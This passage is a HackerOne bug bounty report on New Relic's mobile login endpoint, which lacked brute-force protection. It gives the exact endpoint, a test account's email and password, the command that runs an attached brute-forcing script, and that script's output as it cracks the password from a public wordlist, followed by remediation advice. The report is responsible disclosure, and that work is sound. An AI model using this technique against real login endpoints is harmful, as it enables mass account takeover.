After a couple of 100 automated login attempts, a Captcha is required to login to the account under attack, even from a different IP address. Perfect, good job. I don't see that too often. \n\nHowever, your mobile authentication (login) endpoint currently does not have any protection against brute-force attacks. Login requests to https://login.newrelic.com/api/v1/tokens can be sent in a loop with different values for the \"password\" parameter, and no rate limiting/captcha/account lockout requiring out-of-band verification is present. This allows for brute-forcing of credentials, for example based on breached clear-text password databases of which there are many publicly available (https://wiki.skullsecurity.org/Passwords).\n\nA proof-of-concept python script can be found in attachment. This was invoked to brute-force the credentials of my New Relic test account, ferrariverdasco@gmail.com:Password1!, in a little more than 200 seconds. First, 10.000 wrong guesses are performed taken from a public dictionary (https://github.com/danielmiessler/SecLists/blob/master/Passwords/10k_most_common.txt), after which the 10.001th guess is the correct password and properly identified by the brute-force script. This was then used to login to the mobile app, which worked like a charm - no additional account verification step needed. Of course, a real mass exploitation attack would invoke multiple instances of this script and deploy more threads per instance. It could go at virtually unlimited speeds. \n\n```\n# cat 10k_most_common.txt | wc -l\n10001\n```\n\n```\n# tail 10k_most_common.txt \nhoes\nhowie\nhevnm4\nhugohugo\neighty\nepson\nevangeli\neeeee1\neyphed\nPassword1!\n```\n\n```\n# python newrelicmobilebrute.py ferrariverdasco@gmail.com 10k_most_common.txt 50\n[INFO] Creating 50 worker threads...\n[INFO] Total # passwords: 10001\n[INFO] Total # threads: 50\n71.20 pw/s [] 3% (356/10001)\n57.30 pw/s [=] 5% (573/10001)\n53.67 pw/s [=] 8% (805/10001)\n52.65 pw/s [==] 10% (1053/10001)\n50.84 pw/s [==] 12% (1271/10001)\n50.23 pw/s [===] 15% (1507/10001)\n50.03 pw/s [===] 17% (1751/10001)\n48.98 pw/s [===] 19% (1959/10001)\n49.56 pw/s [====] 22% (2230/10001)\n49.54 pw/s [====] 24% (2477/10001)\n49.89 pw/s [=====] 27% (2744/10001)\n49.32 pw/s [=====] 29% (2959/10001)\n49.85 pw/s [======] 32% (3240/10001)\n49.80 pw/s [======] 34% (3486/10001)\n49.37 pw/s [=======] 37% (3703/10001)\n49.56 pw/s [=======] 39% (3965/10001)\n49.47 pw/s [========] 42% (4205/10001)\n49.12 pw/s [========] 44% (4421/10001)\n49.43 pw/s [=========] 46% (4696/10001)\n49.57 pw/s [=========] 49% (4957/10001)\n49.74 pw/s [==========] 52% (5223/10001)\n49.77 pw/s [==========] 54% (5475/10001)\n49.74 pw/s [===========] 57% (5720/10001)\n49.96 pw/s [===========] 59% (5995/10001)\n49.85 pw/s [============] 62% (6231/10001)\n49.72 pw/s [============] 64% (6463/10001)\n49.95 pw/s [=============] 67% (6743/10001)\n49.76 pw/s [=============] 69% (6967/10001)\n49.70 pw/s [==============] 72% (7206/10001)\n49.68 pw/s [==============] 74% (7452/10001)\n49.54 pw/s [===============] 76% (7679/10001)\n49.68 pw/s [===============] 79% (7949/10001)\n49.75 pw/s [================] 82% (8209/10001)\n49.72 pw/s [================] 84% (8452/10001)\n49.78 pw/s [=================] 87% (8711/10001)\n49.68 pw/s [=================] 89% (8942/10001)\n49.90 pw/s [==================] 92% (9231/10001)\n49.87 pw/s [==================] 94% (9475/10001)\n49.73 pw/s [===================] 96% (9698/10001)\n49.83 pw/s [===================] 99% (9965/10001)\n[SUCCESS] Found the right password: Password1!\n48.79 pw/s [====================] 100% (10001/10001)\n[End] Total time: 207 seconds\n```\n\nOne example of a similar vulnerability that was exploited by blackhats in the past would be Apple's Celebgate scandal of January 2015, where celebrity passwords were brute-forced through an unprotected Apple authentication endpoint. In the case of New Relic, this could lead to the compromise of many accounts, since it is a well-known fact that people tend to choose similar passwords which turn up in dictionaries. \n\nFor more info, see http://www.imperva.com/docs/WP_Consumer_Password_Worst_Practices.pdf . A password analysis study of the 32-million clear-text password leak of the rockyou website breach reveals that by guessing the topmost 4655 passwords in this dump against all users, an attacker will gain access to around 20% of those (page 4). That would be a lot of New Relic accounts.\n\nRecommendation on the short-term: Enforce rate limiting on the mobile authentication endpoint based on IP address\nRecommendation on the mid-to-long term: Implement proper account lockout policy / Captcha protection after threshold on the authentication endpoint has been reached by any attacker.\n\nBest regards,\n\nArne Swinnen\nhttps://www.arneswinnen.net\n\n","weakness":{"id":27,"name":"Improper Authentication - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":82402,"file_name":"newrelicmobilebrute.py","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/082/402/6c734269f7aae36e0b22f2a3048099d187f3c7bb/newrelicmobilebrute.py?response-content-disposition=attachment%3B%20filename%3D%22newrelicmobilebrute.py%22%3B%20filename%2A%3DUTF-8%27%27newrelicmobilebrute.py\u0026response-content-type=text%2Fx-java\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQR4FQPWNR%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T133606Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHQaCXVzLXdlc3QtMiJIMEYCIQCqPrnmIM9wXCdiARyRx5Ax4KzkUTX%2BAA9yp0xp0y3hpwIhAJK%2BGpTIPJ74OaDkXCOQ%2BpTihtprvqS4V5mSUh1y2wU%2FKoMECO3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5Igy0%2FlqLwuvawX3UvDsq1wNbthFe3Azfq%2BVrGAAwOW8v13OVbNefIJYMQ5kDsdlb5HJ08yM0BsqcWahF7IL7L7TYky4BDMksLsE9wim6VKGfrGDkJ2xqf6UemXKLHJTFQYvHptU%2F3szZKR%2FC8LR7%2B6tRZxpqeGaKto06xRg8SdPXPwQ5CCa3sr9z%2FRmk5muNSDIunhQbQtOQkGLdzMqVk6VVPeOXhqlyzAfgT3e83vUfoaaCwfF%2FmCbKBDohDMfithPIZLVroT9vBesKP4IjDlzzfZIO7DWiMOSLRzcTHppAapAKQrTx1YmME3lbOKb0RTUhLkV7At9vcRO6%2FkbRxqMqOEJXCe%2BVL%2BrE6bHoa9n8eWt30xCcMDYrLw%2BgUNiWBz8a2WpzU2sJrhEjHnblMQuWDILIalYkMM7YJoCj0JDvimbFcx%2F8UVUXt3vpIX5YNFVB51MFFGtDIlsnHK31GKw%2BwfgWXHTLxmfkdgOmVicYoRI3iUQD%2BjUHVCHtG%2FOyyW6Jh5Ak5SkV4EnucCAmKjnYxfYTVHvx%2F2qHha2gE7PzO9S1%2F2RLePd%2FBkPMLWvvWtpXghc8EXbG%2FOcrKChbXt0T0mlkm27MvkNDjxxQNHnexQvh%2FlyuMHSSQOsIkoZOkQVEAyb5lyww%2FNOQiwY6pAGOxBpxoNSZNy2UBY4lVVkbrwne8yRQlwxEU8lrQJyCH4OggAZ%2By54oO2xX0ZphtYPfkO82%2FzIZHhgLijH2QZ577nmbTN71zYTVaaML3DYqRqLSP9C1%2F2P5bqIcLRlJSM4rutBebgnwegaTqBmzBoQRinHGD5EkmFos1mfkXnqKw3NLMPoOGBtwvSmsJGplUQJI0wq%2BrRsXTMf9szojjKVaxpuAeg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=4e1d411860b69278bfa9b4e80bd09a56ab17190c23e3e39d91a795f6280265e5","file_size":2874,"type":"text/x-java"},{"id":82403,"file_name":"10k_most_common.txt","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/082/403/5aee429bec41246da393d3c7690670f530dac39c/10k_most_common.txt?response-content-disposition=attachment%3B%20filename%3D%2210k_most_common.txt%22%3B%20filename%2A%3DUTF-8%27%2710k_most_common.txt\u0026response-content-type=text%2Fx-c%2B%2B\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQR4FQPWNR%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T133606Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHQaCXVzLXdlc3QtMiJIMEYCIQCqPrnmIM9wXCdiARyRx5Ax4KzkUTX%2BAA9yp0xp0y3hpwIhAJK%2BGpTIPJ74OaDkXCOQ%2BpTihtprvqS4V5mSUh1y2wU%2FKoMECO3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5Igy0%2FlqLwuvawX3UvDsq1wNbthFe3Azfq%2BVrGAAwOW8v13OVbNefIJYMQ5kDsdlb5HJ08yM0BsqcWahF7IL7L7TYky4BDMksLsE9wim6VKGfrGDkJ2xqf6UemXKLHJTFQYvHptU%2F3szZKR%2FC8LR7%2B6tRZxpqeGaKto06xRg8SdPXPwQ5CCa3sr9z%2FRmk5muNSDIunhQbQtOQkGLdzMqVk6VVPeOXhqlyzAfgT3e83vUfoaaCwfF%2FmCbKBDohDMfithPIZLVroT9vBesKP4IjDlzzfZIO7DWiMOSLRzcTHppAapAKQrTx1YmME3lbOKb0RTUhLkV7At9vcRO6%2FkbRxqMqOEJXCe%2BVL%2BrE6bHoa9n8eWt30xCcMDYrLw%2BgUNiWBz8a2WpzU2sJrhEjHnblMQuWDILIalYkMM7YJoCj0JDvimbFcx%2F8UVUXt3vpIX5YNFVB51MFFGtDIlsnHK31GKw%2BwfgWXHTLxmfkdgOmVicYoRI3iUQD%2BjUHVCHtG%2FOyyW6Jh5Ak5SkV4EnucCAmKjnYxfYTVHvx%2F2qHha2gE7PzO9S1%2F2RLePd%2FBkPMLWvvWtpXghc8EXbG%2FOcrKChbXt0T0mlkm27MvkNDjxxQNHnexQvh%2FlyuMHSSQOsIkoZOkQVEAyb5lyww%2FNOQiwY6pAGOxBpxoNSZNy2UBY4lVVkbrwne8yRQlwxEU8lrQJyCH4OggAZ%2By54oO2xX0ZphtYPfkO82%2FzIZHhgLijH2QZ577nmbTN71zYTVaaML3DYqRqLSP9C1%2F2P5bqIcLRlJSM4rutBebgnwegaTqBmzBoQRinHGD5EkmFos1mfkXnqKw3NLMPoOGBtwvSmsJGplUQJI0wq%2BrRsXTMf9szojjKVaxpuAeg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=623f33c70e82e322052ff4ed94214057e51ad211627b3d7b93cf330fb391c675","file_size":83029,"type":"text/x-c++"}],"allow_singular_disclosure_at":"2017-03-20T01:40:21.776Z","allow_singular_disclosure_after":-143985345.11692068,"singular_disclosure_allowed":true,"vote_count":15,"voters":["delimitry","arneswinnen","mashoud1122","bogdantcaciuc","bl4de","geekboy","brodie_codie","eveeez","malcolmx","khizer47","and 5 more..."],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":884252,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hello Arne,\n\nThank you for your (very well-written) report!
